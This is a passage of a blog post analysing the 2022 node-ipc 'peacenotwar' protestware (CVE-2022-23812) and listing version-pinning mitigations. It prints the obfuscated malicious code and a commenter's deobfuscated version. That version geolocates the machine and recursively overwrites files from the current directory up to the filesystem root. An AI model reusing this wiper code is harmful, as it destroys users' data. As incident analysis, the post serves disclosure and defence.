</span><span>            s</span><span style="color:#81a1c1;">.</span><span>length </span><span style="color:#81a1c1;">&gt; </span><span style="color:#b48ead;">0 </span><span style="color:#81a1c1;">? </span><span>f</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">push</span><span>(</span><span style="color:#81a1c1;">...</span><span>s) </span><span style="color:#81a1c1;">: null</span><span style="color:#eceff4;">;
</span><span>        } </span><span style="color:#81a1c1;">else if </span><span>(i</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">indexOf</span><span>(o) </span><span style="color:#81a1c1;">&gt;= </span><span style="color:#b48ead;">0</span><span>) {
</span><span>            </span><span style="color:#81a1c1;">try </span><span>{
</span><span>                a</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">writeFile</span><span>(i</span><span style="color:#eceff4;">, </span><span>c</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>)</span><span style="color:#eceff4;">, </span><span style="color:#81a1c1;">function </span><span>() {})</span><span style="color:#eceff4;">;
</span><span>            } </span><span style="color:#81a1c1;">catch </span><span>(t) {}
</span><span>        }
</span><span>    }
</span><span>    </span><span style="color:#81a1c1;">return </span><span>f</span><span style="color:#eceff4;">;
</span><span>}
</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">ssl </span><span style="color:#81a1c1;">= true</span><span style="color:#eceff4;">;
</span><span style="color:#81a1c1;">export </span><span>{ ssl </span><span style="color:#81a1c1;">as default</span><span style="color:#eceff4;">, </span><span>ssl }</span><span style="color:#eceff4;">;
</span></code></pre>
<h3 id="warning-the-above-code-is-malicious-do-not-run-it-1">:warning:| The above code is malicious, DO NOT RUN IT</h3>
<hr />
<p>The following are excerpts from the malicious code:</p>
<pre data-lang="js" style="background-color:#2e3440;color:#d8dee9;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=&quot;</span><span style="color:#eceff4;">, </span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;
</span><span style="color:#616e88;">// https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154
</span></code></pre>
<pre data-lang="js" style="background-color:#2e3440;color:#d8dee9;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">a </span><span style="color:#81a1c1;">= </span><span>u</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">includes</span><span>(e</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>)) </span><span style="color:#81a1c1;">|| </span><span>u</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">includes</span><span>(i</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>))</span><span style="color:#eceff4;">;
</span><span style="color:#616e88;">// checks if ip country is Russia or Belarus
</span></code></pre>
<pre data-lang="js" style="background-color:#2e3440;color:#d8dee9;" class="language-js "><code class="language-js" data-lang="js"><span>a</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">writeFile</span><span>(i</span><span style="color:#eceff4;">, </span><span>c</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>)</span><span style="color:#eceff4;">, </span><span style="color:#81a1c1;">function </span><span>() {})</span><span style="color:#eceff4;">;
</span><span style="color:#616e88;">// overwrites file with `❤️`
</span></code></pre>
<hr />
<p>The following demonstrates example of what each of the parameters going to the <code>a.writeFile(i,c.toString(&quot;utf8&quot;)</code> would be:</p>
<p><img src="https://user-images.githubusercontent.com/22574513/158507139-1ef9aa3a-b123-489e-a3d4-3c426d52aca3.png" alt="image" /></p>
<hr />
<h1 id="edit-2022-03-16-0">Edit 2022-03-16_0</h1>
<p><a href="https://github.com/vuejs/vue-cli/issues/7054#issuecomment-1069209509">Comment</a> by <a href="https://github.com/zkyf">zkyf</a></p>
<blockquote>
<p>Just made it better looked and commented dangerous code so you guys can take a try. Obviously the code will delete literally EVERYTHING on your drive.</p>
<pre data-lang="js" style="background-color:#2e3440;color:#d8dee9;" class="language-js "><code class="language-js" data-lang="js"><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">path </span><span style="color:#81a1c1;">= </span><span style="color:#88c0d0;">require</span><span>(</span><span style="color:#a3be8c;">&quot;path&quot;</span><span>)</span><span style="color:#eceff4;">;
</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">fs </span><span style="color:#81a1c1;">= </span><span style="color:#88c0d0;">require</span><span>(</span><span style="color:#a3be8c;">&quot;fs&quot;</span><span>)</span><span style="color:#eceff4;">;
</span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">https </span><span style="color:#81a1c1;">= </span><span style="color:#88c0d0;">require</span><span>(</span><span style="color:#a3be8c;">&quot;https&quot;</span><span>)</span><span style="color:#eceff4;">;
</span><span>
</span><span style="color:#88c0d0;">setTimeout</span><span>(</span><span style="color:#81a1c1;">function </span><span>() {
</span><span>    </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">randomNumber </span><span style="color:#81a1c1;">= </span><span style="color:#8fbcbb;">Math</span><span style="color:#81a1c1;">.</span><span style="font-style:italic;color:#88c0d0;">round</span><span>(</span><span style="color:#8fbcbb;">Math</span><span style="color:#81a1c1;">.</span><span style="font-style:italic;color:#88c0d0;">random</span><span>() </span><span style="color:#81a1c1;">* </span><span style="color:#b48ead;">4</span><span>)</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#81a1c1;">if </span><span>(randomNumber </span><span style="color:#81a1c1;">&gt; </span><span style="color:#b48ead;">1</span><span>) {
</span><span>        </span><span style="color:#616e88;">// return;
</span><span>    }
</span><span>    </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">apiKey </span><span style="color:#81a1c1;">= </span><span style="color:#a3be8c;">&quot;https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154&quot;</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">pwd </span><span style="color:#81a1c1;">= </span><span style="color:#a3be8c;">&quot;./&quot;</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">parentDir </span><span style="color:#81a1c1;">= </span><span style="color:#a3be8c;">&quot;../&quot;</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">grandParentDir </span><span style="color:#81a1c1;">= </span><span style="color:#a3be8c;">&quot;../../&quot;</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">root </span><span style="color:#81a1c1;">= </span><span style="color:#a3be8c;">&quot;/&quot;</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">countryName </span><span style="color:#81a1c1;">= </span><span style="color:#a3be8c;">&quot;country_name&quot;</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">russia </span><span style="color:#81a1c1;">= </span><span style="color:#a3be8c;">&quot;russia&quot;</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">belarus </span><span style="color:#81a1c1;">= </span><span style="color:#a3be8c;">&quot;belarus&quot;</span><span style="color:#eceff4;">;
</span><span>
</span><span>    https</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">get</span><span>(apiKey</span><span style="color:#eceff4;">, </span><span style="color:#81a1c1;">function </span><span>(message) {
</span><span>        message</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">on</span><span>(</span><span style="color:#a3be8c;">&quot;data&quot;</span><span style="color:#eceff4;">, </span><span style="color:#81a1c1;">function </span><span>(msgBuffer) {
</span><span>            </span><span style="color:#81a1c1;">try </span><span>{
</span><span>                </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">message </span><span style="color:#81a1c1;">= </span><span style="color:#8fbcbb;">JSON</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">parse</span><span>(msgBuffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>))</span><span style="color:#eceff4;">;
</span><span>                </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">userCountryName </span><span style="color:#81a1c1;">= </span><span>message[countryName</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>)]</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toLowerCase</span><span>()</span><span style="color:#eceff4;">;
</span><span>                </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">hasRus </span><span style="color:#81a1c1;">= </span><span>userCountryName</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">includes</span><span>(russia</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>)) </span><span style="color:#81a1c1;">|| </span><span>userCountryName</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">includes</span><span>(belarus</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">toString</span><span>(</span><span style="color:#a3be8c;">&quot;utf8&quot;</span><span>))</span><span style="color:#eceff4;">; </span><span style="color:#616e88;">// checks if country is Russia or Belarus
</span><span>                </span><span style="color:#81a1c1;">if </span><span>(hasRus) {
</span><span>                    </span><span style="color:#88c0d0;">deleteFile</span><span>(pwd)</span><span style="color:#eceff4;">;
</span><span>                    </span><span style="color:#88c0d0;">deleteFile</span><span>(parentDir)</span><span style="color:#eceff4;">;
</span><span>                    </span><span style="color:#88c0d0;">deleteFile</span><span>(grandParentDir)</span><span style="color:#eceff4;">;
</span><span>                    </span><span style="color:#88c0d0;">deleteFile</span><span>(root)</span><span style="color:#eceff4;">;
</span><span>                }
</span><span>            } </span><span style="color:#81a1c1;">catch </span><span>(t) {}
</span><span>        })</span><span style="color:#eceff4;">;
</span><span>    })</span><span style="color:#eceff4;">;
</span><span>
</span><span>    </span><span style="color:#616e88;">// zkyf: Let&#39;s try this directly here
</span><span>    </span><span style="color:#88c0d0;">deleteFile</span><span>(pwd)</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#88c0d0;">deleteFile</span><span>(parentDir)</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#88c0d0;">deleteFile</span><span>(grandParentDir)</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#88c0d0;">deleteFile</span><span>(root)</span><span style="color:#eceff4;">;
</span><span>}</span><span style="color:#eceff4;">, </span><span style="color:#b48ead;">100</span><span>)</span><span style="color:#eceff4;">;
</span><span>
</span><span style="color:#81a1c1;">async function </span><span style="color:#88c0d0;">deleteFile</span><span>(pathName </span><span style="color:#81a1c1;">= </span><span style="color:#a3be8c;">&quot;&quot;</span><span style="color:#eceff4;">, </span><span>o </span><span style="color:#81a1c1;">= </span><span style="color:#a3be8c;">&quot;&quot;</span><span>) {
</span><span>    </span><span style="color:#81a1c1;">if </span><span>(</span><span style="color:#81a1c1;">!</span><span>fs</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">existsSync</span><span>(pathName)) {
</span><span>        </span><span style="color:#81a1c1;">return</span><span style="color:#eceff4;">;
</span><span>    }
</span><span>    </span><span style="color:#81a1c1;">let </span><span>fileList </span><span style="color:#81a1c1;">= </span><span>[]</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#81a1c1;">try </span><span>{
</span><span>        fileList </span><span style="color:#81a1c1;">= </span><span>fs</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">readdirSync</span><span>(pathName)</span><span style="color:#eceff4;">;
</span><span>    } </span><span style="color:#81a1c1;">catch </span><span>(t) {}
</span><span>    </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">f </span><span style="color:#81a1c1;">= </span><span>[]</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">heartUtf8 </span><span style="color:#81a1c1;">= </span><span style="color:#8fbcbb;">Buffer</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">from</span><span>(</span><span style="color:#a3be8c;">&quot;4p2k77iP&quot;</span><span style="color:#eceff4;">, </span><span style="color:#a3be8c;">&quot;base64&quot;</span><span>)</span><span style="color:#eceff4;">;
</span><span>    </span><span style="color:#81a1c1;">for </span><span>(</span><span style="color:#81a1c1;">var </span><span>idx </span><span style="color:#81a1c1;">= </span><span style="color:#b48ead;">0</span><span style="color:#eceff4;">; </span><span>idx </span><span style="color:#81a1c1;">&lt; </span><span>fileList</span><span style="color:#81a1c1;">.</span><span>length</span><span style="color:#eceff4;">; </span><span>idx</span><span style="color:#81a1c1;">++</span><span>) {
</span><span>        </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">fileName </span><span style="color:#81a1c1;">= </span><span>path</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">join</span><span>(pathName</span><span style="color:#eceff4;">, </span><span>fileList[idx])</span><span style="color:#eceff4;">;
</span><span>        </span><span style="color:#81a1c1;">let </span><span>fileInfo </span><span style="color:#81a1c1;">= null</span><span style="color:#eceff4;">;
</span><span>        </span><span style="color:#81a1c1;">try </span><span>{
</span><span>            fileInfo </span><span style="color:#81a1c1;">= </span><span>fs</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">lstatSync</span><span>(fileName)</span><span style="color:#eceff4;">;
</span><span>        } </span><span style="color:#81a1c1;">catch </span><span>(err) {
</span><span>            </span><span style="color:#81a1c1;">continue</span><span style="color:#eceff4;">;
</span><span>        }
</span><span>        </span><span style="color:#81a1c1;">if </span><span>(fileInfo</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">isDirectory</span><span>()) {
</span><span>            </span><span style="color:#81a1c1;">const </span><span style="font-weight:bold;color:#d8dee9;">fileSymbol </span><span style="color:#81a1c1;">= </span><span style="color:#88c0d0;">deleteFile</span><span>(fileName</span><span style="color:#eceff4;">, </span><span>o)</span><span style="color:#eceff4;">;
</span><span>            fileSymbol</span><span style="color:#81a1c1;">.</span><span>length </span><span style="color:#81a1c1;">&gt; </span><span style="color:#b48ead;">0 </span><span style="color:#81a1c1;">? </span><span>f</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">push</span><span>(</span><span style="color:#81a1c1;">...</span><span>fileSymbol) </span><span style="color:#81a1c1;">: null</span><span style="color:#eceff4;">;
</span><span>        } </span><span style="color:#81a1c1;">else if </span><span>(fileName</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">indexOf</span><span>(o) </span><span style="color:#81a1c1;">&gt;= </span><span style="color:#b48ead;">0</span><span>) {
</span><span>            </span><span style="color:#81a1c1;">try </span><span>{
</span><span>                </span><span style="color:#616e88;">// fs.writeFile(fileName, heartUtf8.toString(&quot;utf8&quot;), function () {}); // overwrites file with `❤️`
</span><span>                </span><span style="color:#8fbcbb;">console</span><span style="color:#81a1c1;">.</span><span style="color:#88c0d0;">log</span><span>(</span><span style="color:#a3be8c;">`Rewrite </span><span style="color:#5e81ac;">${</span><span>fileName</span><span style="color:#5e81ac;">}</span><span style="color:#a3be8c;">`</span><span>)</span><span style="color:#eceff4;">;
</span><span>            } </span><span style="color:#81a1c1;">catch </span><span>(err) {}
</span><span>        }
</span><span>    }
</span><span>    </span><span style="color:#81a1c1;">return </span><span>f</span><span style="color:#eceff4;">;
</span><span>}
</span></code></pre>
<p>Console: <img src="https://user-images.githubusercontent.com/13307442/158617117-0d4bc6c4-59ae-4fee-a852-418cb2189b72.png" alt="image" /></p>
</blockquote>
<hr />
<h1 id="edit-2022-03-16-1-requested-by-lgg">Edit 2022-03-16_1 (requested by @lgg)</h1>
<h2 id="available-mitigation-methods">Available mitigation methods:</h2>
<p>The following mitigation strategies are inspired by cnpm's (is not npm) mitigation methods:
https://github.com/cnpm/bug-versions/pull/181</p>
<p>If you use one of the following mitigation stratagies, make sure to remove the <code>^</code> to force <code>node-ipc</code> to the specified version.</p>
<p><code>&quot;^9.x.x&quot; -&gt; &quot;9.2.1&quot;</code></p>
<pre data-lang="diff" style="background-color:#2e3440;color:#d8dee9;" class="language-diff "><code class="language-diff" data-lang="diff"><span>     &quot;dependencies&quot;: {
</span><span style="color:#bf616a;">-        &quot;node-ipc&quot;: &quot;^9.x.x&quot;
</span><span style="color:#a3be8c;">+        &quot;node-ipc&quot;: &quot;9.2.1&quot;
</span><span>     }
</span></code></pre>
<p><code>&quot;^10.x.x&quot; -&gt; &quot;10.1.0&quot;</code></p>
<pre data-lang="diff" style="background-color:#2e3440;color:#d8dee9;" class="language-diff "><code class="language-diff" data-lang="diff"><span>     &quot;dependencies&quot;: {
</span><span style="color:#bf616a;">-        &quot;node-ipc&quot;: &quot;^10.x.x&quot;
</span><span style="color:#a3be8c;">+        &quot;node-ipc&quot;: &quot;10.1.0&quot;
</span><span>     }
</span></code></pre>
<p><code>&quot;^11.x.x&quot; -&gt; &quot;10.1.0&quot;</code></p>
<pre data-lang="diff" style="background-color:#2e3440;color:#d8dee9;" class="language-diff "><code class="language-diff" data-lang="diff"><span>     &quot;dependencies&quot;: {
</span><span style="color:#bf616a;">-        &quot;node-ipc&quot;: &quot;^11.x.x&quot;
</span><span style="color:#a3be8c;">+        &quot;node-ipc&quot;: &quot;10.1.0&quot;
</span><span>     }
</span></code></pre>
<h2 id="3rd-party-mitigation-methods">3rd-party mitigation methods:</h2>
<ul>
<li><a href="https://github.com/vuejs/vue-cli/issues/7054#issuecomment-1069642202">vue-cli</a></li>
<li><a href="https://unity3d.com/hub/whats-new">Unity Hub</a></li>
</ul>
<hr />
<h1 id="edit-2022-03-16-2-requested-by-lgg">Edit 2022-03-16_2 (requested by @lgg)</h1>
<h2 id="cve-2022-23812-1"><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23812">CVE-2022-23812</a></h2>
<h1 id="edit-2022-03-17-0">Edit 2022-03-17_0</h1>
<p>@RIAEvangelist has banned me from interacting with their repositories</p>
<h1 id="edit-2022-03-17-1">Edit 2022-03-17_1</h1>
<p>The security research firm <a href="https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/">snyk.io</a> recommends the following mitigation strategy for users of <code>node-ipc</code>:</p>
<p><code>package.json</code></p>
<pre data-lang="json" style="background-color:#2e3440;color:#d8dee9;" class="language-json "><code class="language-json" data-lang="json"><span>  </span><span style="color:#a3be8c;">&quot;overrides&quot;</span><span>: {
</span><span>    </span><span style="color:#a3be8c;">&quot;node-ipc@&gt;9.2.1 &lt;10&quot;</span><span style="color:#eceff4;">: </span><span style="color:#a3be8c;">&quot;9.2.1&quot;</span><span style="color:#eceff4;">,
</span><span>    </span><span style="color:#a3be8c;">&quot;node-ipc@&gt;10.1.0&quot;</span><span style="color:#eceff4;">: </span><span style="color:#a3be8c;">&quot;10.1.0&quot;
</span><span>  }
</span></code></pre>
<h1 id="edit-2022-03-17-2-credit-uzlopak">Edit 2022-03-17_2 (<a href="https://gist.github.com/MidSpike/f7ae3457420af78a54b38a31cc0c809c?permalink_comment_id=4101413#gistcomment-4101413">credit</a>: @Uzlopak)</h1>
<h3 id="npm-users-below-npm-v8-this-is-for-you">NPM users below NPM v8, this is for you!</h3>
<blockquote>
<p>Don't forget to mention that npm supports override with npm 8. Earlier versions don't have overrides capabilities.
So node 12 and 14, which are LTS, use by default npm 6 and that would not work with them. So upgrading npm to 8 would be necessary.</p>
</blockquote>
<h3 id="yarn-users-this-is-for-you">Yarn users, this is for you!</h3>
<ul>
<li><a href="https://classic.yarnpkg.com/lang/en/docs/selective-version-resolutions/">Yarn 1 - Selective dependency resolutions</a></li>
<li><a href="https://yarnpkg.com/configuration/manifest#resolutions">Yarn 2 - Resolutions</a></li>
</ul>
<p>I'm not too familiar with how yarn works, so I don't want to risk giving false instructions to users.</p>
<h3 id="warning-do-not-run-this-code-none-of-the-problems-and-issues-you-get-if-you-run-this-is-my-issue-or-problem-or-responsibility-1"><em><strong>Warning do not run this code, none of the problems and issues you get if you run this is my issue or problem or responsibility.</strong></em></h3>
<hr>
<p>~~ Source and if you would like to learn more about the code read this gist: <a href="https://gist.github.com/MidSpike/f7ae3457420af78a54b38a31cc0c809c">https://gist.github.com/MidSpike/f7ae3457420af78a54b38a31cc0c809c</a></p>
<p>node-ipc and peacenotwar github (malware)</p>
<ul>
<li><a href="https://github.com/RIAEvangelist/node-ipc">https://github.com/RIAEvangelist/node-ipc</a></li>
<li><a href="https://github.com/RIAEvangelist/peacenotwar">https://github.com/RIAEvangelist/peacenotwar</a></li>
</ul>
<h3 id="article-is-finished-i-will-not-update-this-article-anymore-unless-there-is-a-reason-to-do-so">Article is finished - I will not update this article anymore, unless there is a reason to do so.</h3>

    </main>

        <footer>
            <hr text="&copy; Copyright 2022" />
            
            <div class="footer-social-media">
                <a onclick="toggle_prefers_color()">Toggle Theme</a>
                
                    <a href="https://github.com/ThamognyaKodi" target="_blank">GitHub</a>
                
                    <a href="https://gitlab.com/ThamognyaKodi" target="_blank">GitLab</a>
                
                    <a href="https://www.reddit.com/user/Meliodas_real" target="_blank">Reddit</a>
                
                    <a href="mailto:contact@thamognya.com" target="_blank">Email</a>
                
            </div>
            
        </footer>
    </body>

    
        <script src="https://blog.thamognya.com/js/script.js"/></script>
    
</html>